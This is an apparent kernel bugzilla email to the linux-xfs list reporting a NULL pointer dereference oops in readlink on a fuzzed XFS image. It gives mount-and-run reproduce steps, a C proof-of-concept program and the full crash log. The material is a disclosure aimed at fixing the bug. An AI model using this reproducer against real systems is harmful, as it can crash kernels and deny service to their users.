Return-Path: <linux-xfs-owner@vger.kernel.org>
Received: from mail.wl.linuxfoundation.org ([198.145.29.98]:44368 "EHLO
        mail.wl.linuxfoundation.org" rhost-flags-OK-OK-OK-OK)
        by vger.kernel.org with ESMTP id S1754549AbeFRDqc (ORCPT
        <rfc822;linux-xfs@vger.kernel.org>); Sun, 17 Jun 2018 23:46:32 -0400
Received: from mail.wl.linuxfoundation.org (localhost [127.0.0.1])
        by mail.wl.linuxfoundation.org (Postfix) with ESMTP id 67A2D28987
        for <linux-xfs@vger.kernel.org>; Mon, 18 Jun 2018 03:46:32 +0000 (UTC)
From: bugzilla-daemon@bugzilla.kernel.org
Subject: [Bug 200119] New: Kernel oops at NULL pointer when performing
 readlink on a fuzzed xfs image
Date: Mon, 18 Jun 2018 03:46:31 +0000
Message-ID: <bug-200119-201763@https.bugzilla.kernel.org/>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8BIT
MIME-Version: 1.0
Sender: linux-xfs-owner@vger.kernel.org
List-ID: <linux-xfs.vger.kernel.org>
List-Id: xfs
To: linux-xfs@kernel.org

https://bugzilla.kernel.org/show_bug.cgi?id=200119

            Bug ID: 200119
           Summary: Kernel oops at NULL pointer when performing readlink
                    on a fuzzed xfs image
           Product: File System
           Version: 2.5
    Kernel Version: 4.17
          Hardware: All
                OS: Linux
              Tree: Mainline
            Status: NEW
          Severity: normal
          Priority: P1
         Component: XFS
          Assignee: filesystem_xfs@kernel-bugs.kernel.org
          Reporter: wen.xu@gatech.edu
        Regression: No

Created attachment 276639
  --> https://bugzilla.kernel.org/attachment.cgi?id=276639&action=edit
The (compressed) crafted image which causes crash

- Reproduce (4.17/for-next branch)
# mkdir mnt
# mount -t xfs final.img mnt
# gcc -o poc poc.c
# ./poc ./mnt

- POC (poc.c)
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/xattr.h>

#include <dirent.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/falloc.h>
#include <linux/loop.h>

// derived from
https://github.com/oracle/kernel-fuzzing/blob/master/include/mount.hh
static void activity(char *mpoint) {

  char *foo_bar_baz;
  char *sln;
  int err;

  static int buf[8192];
  memset(buf, 0, sizeof(buf));

  err = asprintf(&foo_bar_baz, "%s/foo/bar/baz", mpoint);
  err = asprintf(&sln, "%s/foo/bar/sln", mpoint);

  int fd = open(foo_bar_baz, O_RDWR | O_TRUNC, 0777);
  if (fd >= 0) {
    write(fd, (char *)buf, 517);
    write(fd, (char *)buf, sizeof(buf));
    close(fd);
  }

  unlink(foo_bar_baz);

  char buf2[113];
  memset(buf2, 0, sizeof(buf2));
  readlink(sln, buf2, sizeof(buf2));

}

int main(int argc, char *argv[]) {
  activity(argv[1]);
  return 0;
}

- Kernel message
[  315.207956] XFS (loop0): Mounting V5 Filesystem
[  315.214851] XFS (loop0): Ending clean mount
[  315.214976] Filesystem "loop0": reserve blocks depleted! Consider increasing
reserve pool size.
[  315.214979] XFS (loop0): Per-AG reservation for AG 0 failed.  Filesystem may
run out of space.
[  315.214981] XFS (loop0): Per-AG reservation for AG 0 failed.  Filesystem may
run out of space.
[  326.041728] XFS (loop0): Failed to remove inode(s) from unlinked list.
Please free space, unmount and run xfs_repair.
[  326.041877] BUG: unable to handle kernel NULL pointer dereference at
0000000000000000
[  326.043479] PGD 800000023376b067 P4D 800000023376b067 PUD 22d37c067 PMD 0
[  326.044864] Oops: 0000 [#1] SMP PTI
[  326.045582] Modules linked in: snd_hda_codec_generic snd_hda_intel
snd_hda_codec snd_hwdep snd_hda_core snd_pcm snd_timer snd soundcore i2c_piix4
mac_hid ib_iser rdma_cm iw_cm ib_cm ib_core iscsi_tcp libiscsi_tcp libiscsi
scsi_transport_iscsi autofs4 raid10 raid456 async_raid6_recov async_memcpy
async_pq async_xor async_tx raid1 raid0 multipath linear qxl drm_kms_helper
syscopyarea sysfillrect sysimgblt fb_sys_fops ttm drm crct10dif_pclmul
crc32_pclmul 8139too aesni_intel aes_x86_64 crypto_simd cryptd glue_helper
floppy pata_acpi 8139cp mii
[  326.055084] CPU: 1 PID: 1329 Comm: poc Not tainted 4.17.0-rc7-no-kasan+ #1
[  326.056448] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
Ubuntu-1.8.2-1ubuntu1 04/01/2014
[  326.058363] RIP: 0010:strlen+0x0/0x20
[  326.059098] RSP: 0018:ffffa11780c7fe48 EFLAGS: 00010207
[  326.060142] RAX: 0000000000000000 RBX: 0000000000000071 RCX:
0000000000000017
[  326.061538] RDX: 0000000000000000 RSI: 0000000000000071 RDI:
0000000000000000
[  326.062941] RBP: ffffa11780c7fe68 R08: 0000000000026ce0 R09:
ffffffff9627a1d4
[  326.064370] R10: ffffa11780c7fea0 R11: ffff8d9e2fc4a200 R12:
0000000000000000
[  326.065781] R13: 00007ffe63bd34b0 R14: 00007ffe63bd34b0 R15:
0000000000000071
[  326.067185] FS:  00007f60d48b4700(0000) GS:ffff8d9e3fd00000(0000)
knlGS:0000000000000000
[  326.068786] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  326.069922] CR2: 0000000000000000 CR3: 00000002300e6000 CR4:
00000000000006e0
[  326.071643] Call Trace:
[  326.072217]  ? readlink_copy+0x29/0x50
[  326.072988]  vfs_readlink+0x66/0x130
[  326.073709]  do_readlinkat+0xfa/0x120
[  326.074443]  __x64_sys_readlink+0x1f/0x30
[  326.075264]  do_syscall_64+0x5a/0x110
[  326.076018]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  326.077026] RIP: 0033:0x7f60d43c7a37
[  326.077735] RSP: 002b:00007ffe63bd33c8 EFLAGS: 00000202 ORIG_RAX:
0000000000000059
[  326.079205] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
00007f60d43c7a37
[  326.080607] RDX: 0000000000000071 RSI: 00007ffe63bd34b0 RDI:
0000000001c42100
[  326.081995] RBP: 00007ffe63bd3530 R08: 0000000000000002 R09:
0000000000000001
[  326.083385] R10: 000000000000058b R11: 0000000000000202 R12:
0000000000400c20
[  326.084784] R13: 00007ffe63bd3630 R14: 0000000000000000 R15:
0000000000000000
[  326.086172] Code: 89 f8 48 89 e5 f6 82 c0 ce 10 97 20 74 10 48 83 c0 01 0f
b6 10 f6 82 c0 ce 10 97 20 75 f0 5d c3 90 66 2e 0f 1f 84 00 00 00 00 00 <80> 3f
00 55 48 89 e5 74 11 48 89 f8 48 83 c0 01 80 38 00 75 f7
[  326.089834] RIP: strlen+0x0/0x20 RSP: ffffa11780c7fe48
[  326.090838] CR2: 0000000000000000
[  326.091566] ---[ end trace c50eae73b71ba45e ]---

Reported by Wen Xu (wen.xu@gatech.edu) from SSLab at Gatech.

-- 
You are receiving this mail because:
You are watching the assignee of the bug.